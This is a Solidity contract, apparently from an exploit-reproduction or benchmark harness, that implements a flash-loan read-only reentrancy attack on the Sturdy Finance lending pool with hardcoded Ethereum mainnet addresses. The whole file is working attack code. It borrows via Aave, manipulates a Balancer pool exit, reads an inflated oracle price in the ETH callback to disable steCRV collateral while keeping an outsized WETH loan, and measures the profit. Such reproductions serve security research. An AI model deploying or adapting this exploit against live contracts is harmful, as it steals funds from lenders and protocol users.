// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH9 is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IwstETH is IERC20 {
    function unwrap(uint256 amount) external returns (uint256);
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 minMintAmount) external payable returns (uint256);
    function remove_liquidity_one_coin(uint256 tokenAmount, int128 i, uint256 minAmount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external payable;
}

interface IBalancerVault {
    struct JoinPoolRequest {
        address[] assets;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    struct ExitPoolRequest {
        address[] assets;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    function joinPool(bytes32 poolId, address sender, address recipient, JoinPoolRequest memory request) external payable;
    function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request) external payable;
}

interface IMetaStablePool is IERC20 {
    function getPoolId() external view returns (bytes32);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ILendingPool {
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralETH,
            uint256 totalDebtETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );

    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;

    function getReserveData(address asset)
        external
        view
        returns (
            uint256 configuration,
            uint128 liquidityIndex,
            uint128 variableBorrowIndex,
            uint128 currentLiquidityRate,
            uint128 currentVariableBorrowRate,
            uint128 currentStableBorrowRate,
            uint40 lastUpdateTimestamp,
            address aTokenAddress,
            address stableDebtTokenAddress,
            address variableDebtTokenAddress,
            address interestRateStrategyAddress,
            uint8 id
        );
}

interface ILPVault {
    function depositCollateralFrom(address asset, uint256 amount, address user) external payable;
    function withdrawCollateral(address asset, uint256 amount, uint256 slippage, address to) external;
}

interface ISturdyOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}

contract FlawVerifier {
    IWETH9 internal constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH internal constant WSTETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 internal constant STECRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 internal constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    ICurvePool internal constant LIDO_CURVE_POOL = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IAaveFlashloan internal constant AAVE_V3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IMetaStablePool internal constant B_STETH_STABLE = IMetaStablePool(0x32296969Ef14EB0c6d29669C550D4a0449130230);
    ILendingPool internal constant LENDING_POOL = ILendingPool(0x9f72DC67ceC672bB99e3d02CbEA0a21536a2b657);
    ILPVault internal constant AURA_BALANCER_LP_VAULT = ILPVault(0x6AE5Fd07c0Bb2264B1F60b33F65920A2b912151C);
    ILPVault internal constant CONVEX_CURVE_LP_VAULT = ILPVault(0xa36BE47700C079BD94adC09f35B0FA93A55297bc);
    IBalancerVault internal constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ISturdyOracle internal constant STURDY_ORACLE = ISturdyOracle(0xe5d78eB340627B8D5bcFf63590Ebec1EF9118C89);

    address internal constant CB_STETH_STABLE = 0x10aA9eea35A3102Cc47d4d93Bc0BA9aE45557746;
    address internal constant CSTECRV = 0x901247D08BEbFD449526Da92941B35D756873Bcd;

    uint256 internal constant JOIN_WSTETH_AMOUNT = 50_000 ether;
    uint256 internal constant JOIN_WETH_AMOUNT = 57_000 ether;
    uint256 internal constant STECRV_SEED_ETH = 1_100 ether;
    uint256 internal constant STECRV_COLLATERAL_AMOUNT = 1_000 ether;
    uint256 internal constant TARGET_BPT_COLLATERAL = 233_348_773_557_117_598_739;
    uint256 internal constant TARGET_BORROW_WETH = 513_367_301_825_658_717_226;
    uint256 internal constant BORROW_BUFFER_BPS = 9_950;
    uint256 internal constant RESERVE_LIQUIDITY_BUFFER = 1 ether;

    uint256 internal _profitAmount;
    uint256 internal _startingProfitBalance;

    uint256 public oraclePriceBeforeExit;
    uint256 public oraclePriceDuringCallback;
    uint256 public oraclePriceAfterExit;
    uint256 public borrowedWethAmount;

    bool public attempted;
    bool public hypothesisValidated;

    bool internal exitPoolInProgress;
    bool internal callbackUsed;

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;
        _startingProfitBalance = WETH.balanceOf(address(this));

        uint256 wstEthShortfall = _wstEthShortfall();
        uint256 wethShortfall = _wethShortfall();

        if (wstEthShortfall == 0 && wethShortfall == 0) {
            _executeExploit();
            _recordProfit();
            return;
        }

        _requestFundingViaFlashloan(wstEthShortfall, wethShortfall);
        _recordProfit();
    }

    function executeOperation(address[] calldata, uint256[] calldata amounts, uint256[] calldata premiums, address, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == address(AAVE_V3), "not-aave");
        require(amounts.length == 2 && premiums.length == 2, "bad-flashloan-shape");

        uint256 repayWstEth = amounts[0] + premiums[0];
        uint256 repayWeth = amounts[1] + premiums[1];

        _executeExploit();
        _unwindForRepaymentAndProfit(repayWstEth);

        require(WSTETH.balanceOf(address(this)) >= repayWstEth, "insufficient-wsteth");
        require(WETH.balanceOf(address(this)) > repayWeth, "non-profitable");
        require(WSTETH.approve(address(AAVE_V3), repayWstEth), "approve-wsteth");
        require(WETH.approve(address(AAVE_V3), repayWeth), "approve-weth");
        return true;
    }

    function _executeExploit() internal {
        _mintSteCrvSeedPosition();
        _joinBalancerPoolWithWstETHWETH();
        _depositBStEthStableAndSteCrvAsCollateral();
        _borrowWETH();
        _callBalancerExitPool();
        _withdrawFreedSteCrvCollateral();
        _finalizeValidation();
    }

    function _requestFundingViaFlashloan(uint256 wstEthShortfall, uint256 wethShortfall) internal {
        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(WETH);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = wstEthShortfall;
        amounts[1] = wethShortfall;

        uint256[] memory modes = new uint256[](2);

        AAVE_V3.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
    }

    function _mintSteCrvSeedPosition() internal {
        WETH.withdraw(STECRV_SEED_ETH);

        uint256[2] memory amounts;
        amounts[0] = STECRV_SEED_ETH;
        amounts[1] = 0;
        LIDO_CURVE_POOL.add_liquidity{value: STECRV_SEED_ETH}(amounts, 1_000 ether);
    }

    // Exploit path 0: Join Balancer pool with wstETH/WETH.
    function _joinBalancerPoolWithWstETHWETH() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();

        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(WETH);

        uint256[] memory maxAmountsIn = new uint256[](2);
        maxAmountsIn[0] = JOIN_WSTETH_AMOUNT;
        maxAmountsIn[1] = JOIN_WETH_AMOUNT;

        IBalancerVault.JoinPoolRequest memory request = IBalancerVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: maxAmountsIn,
            userData: abi.encode(uint256(1), maxAmountsIn, uint256(0)),
            fromInternalBalance: false
        });

        require(WSTETH.approve(address(BALANCER), JOIN_WSTETH_AMOUNT), "approve-join-wsteth");
        require(WETH.approve(address(BALANCER), JOIN_WETH_AMOUNT), "approve-join-weth");
        BALANCER.joinPool(poolId, address(this), address(this), request);
    }

    // Exploit path 1: Deposit B-stETH-STABLE and steCRV as collateral.
    function _depositBStEthStableAndSteCrvAsCollateral() internal {
        require(STECRV.approve(address(CONVEX_CURVE_LP_VAULT), STECRV_COLLATERAL_AMOUNT), "approve-stecrv");
        CONVEX_CURVE_LP_VAULT.depositCollateralFrom(address(STECRV), STECRV_COLLATERAL_AMOUNT, address(this));

        uint256 bptCollateral = B_STETH_STABLE.balanceOf(address(this));
        if (bptCollateral > TARGET_BPT_COLLATERAL) {
            bptCollateral = TARGET_BPT_COLLATERAL;
        }

        require(bptCollateral != 0, "zero-bpt-collateral");
        require(B_STETH_STABLE.approve(address(AURA_BALANCER_LP_VAULT), bptCollateral), "approve-bpt");
        AURA_BALANCER_LP_VAULT.depositCollateralFrom(address(B_STETH_STABLE), bptCollateral, address(this));
    }

    // Exploit path 2: Borrow WETH.
    function _borrowWETH() internal {
        uint256 borrowAmount = (_availableBorrowsEth() * BORROW_BUFFER_BPS) / 10_000;
        if (borrowAmount > TARGET_BORROW_WETH) {
            borrowAmount = TARGET_BORROW_WETH;
        }

        uint256 reserveLiquidity = _wethReserveLiquidity();
        require(reserveLiquidity > RESERVE_LIQUIDITY_BUFFER, "weth-reserve-empty");

        uint256 reserveCap = reserveLiquidity - RESERVE_LIQUIDITY_BUFFER;
        if (borrowAmount > reserveCap) {
            borrowAmount = reserveCap;
        }

        require(borrowAmount != 0, "zero-borrow");
        borrowedWethAmount = borrowAmount;
        LENDING_POOL.borrow(address(WETH), borrowAmount, 2, 0, address(this));
    }

    // Exploit path 3: Call Balancer exitPool().
    function _callBalancerExitPool() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        uint256 bptIn = B_STETH_STABLE.balanceOf(address(this));
        require(bptIn != 0, "no-bpt-to-exit");

        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(0);

        uint256[] memory minAmountsOut = new uint256[](2);

        IBalancerVault.ExitPoolRequest memory request = IBalancerVault.ExitPoolRequest({
            assets: assets,
            minAmountsOut: minAmountsOut,
            userData: abi.encode(uint256(1), bptIn),
            toInternalBalance: false
        });

        oraclePriceBeforeExit = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
        callbackUsed = false;
        exitPoolInProgress = true;
        BALANCER.exitPool(poolId, address(this), payable(address(this)), request);
        exitPoolInProgress = false;

        oraclePriceAfterExit = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
        require(callbackUsed, "callback-not-hit");
    }

    function _withdrawFreedSteCrvCollateral() internal {
        CONVEX_CURVE_LP_VAULT.withdrawCollateral(address(STECRV), STECRV_COLLATERAL_AMOUNT, 10, address(this));
    }

    function _unwindForRepaymentAndProfit(uint256 repayWstEth) internal {
        uint256 steCrvBalance = STECRV.balanceOf(address(this));
        if (steCrvBalance != 0) {
            LIDO_CURVE_POOL.remove_liquidity_one_coin(steCrvBalance, 0, 1);
        }

        uint256 currentWstEth = WSTETH.balanceOf(address(this));
        if (currentWstEth > repayWstEth) {
            WSTETH.unwrap(currentWstEth - repayWstEth);
        }

        uint256 stEthBalance = STETH.balanceOf(address(this));
        if (stEthBalance != 0) {
            require(STETH.approve(address(LIDO_CURVE_POOL), stEthBalance), "approve-steth");
            LIDO_CURVE_POOL.exchange(1, 0, stEthBalance, 1);
        }

        // Realistic public unwind only: convert withdrawn collateral and Balancer exit proceeds back into WETH
        // so the flashloan can be repaid and residual profit is measured in an existing on-chain token.
        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }
    }

    function _finalizeValidation() internal {
        hypothesisValidated = oraclePriceDuringCallback > oraclePriceBeforeExit
            && oraclePriceDuringCallback > oraclePriceAfterExit;
    }

    function _recordProfit() internal {
        uint256 current = WETH.balanceOf(address(this));
        _profitAmount = current > _startingProfitBalance ? current - _startingProfitBalance : 0;
    }

    function _availableBorrowsEth() internal view returns (uint256 availableBorrowsETH) {
        (, , availableBorrowsETH, , , ) = LENDING_POOL.getUserAccountData(address(this));
    }

    function _wethReserveLiquidity() internal view returns (uint256) {
        (, , , , , , , address wethAToken, , , , ) = LENDING_POOL.getReserveData(address(WETH));
        return WETH.balanceOf(wethAToken);
    }

    function _wstEthShortfall() internal view returns (uint256) {
        uint256 bal = WSTETH.balanceOf(address(this));
        return bal >= JOIN_WSTETH_AMOUNT ? 0 : JOIN_WSTETH_AMOUNT - bal;
    }

    function _wethShortfall() internal view returns (uint256) {
        uint256 required = JOIN_WETH_AMOUNT + STECRV_SEED_ETH;
        uint256 bal = WETH.balanceOf(address(this));
        return bal >= required ? 0 : required - bal;
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {
        if (exitPoolInProgress && !callbackUsed) {
            callbackUsed = true;
            _onExitPoolEthCallbackReadInflatedBptPrice();
            _onExitPoolEthCallbackDisableSteCrvCollateral();
        }
    }

    // Exploit path 4: In the ETH callback, oracle reads inflated B-stETH-STABLE price.
    function _onExitPoolEthCallbackReadInflatedBptPrice() internal {
        oraclePriceDuringCallback = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
    }

    // Exploit path 5: Call setUserUseReserveAsCollateral(CSTECRV, false) while health checks rely on the inflated value.
    function _onExitPoolEthCallbackDisableSteCrvCollateral() internal {
        LENDING_POOL.setUserUseReserveAsCollateral(CSTECRV, false);
    }
}
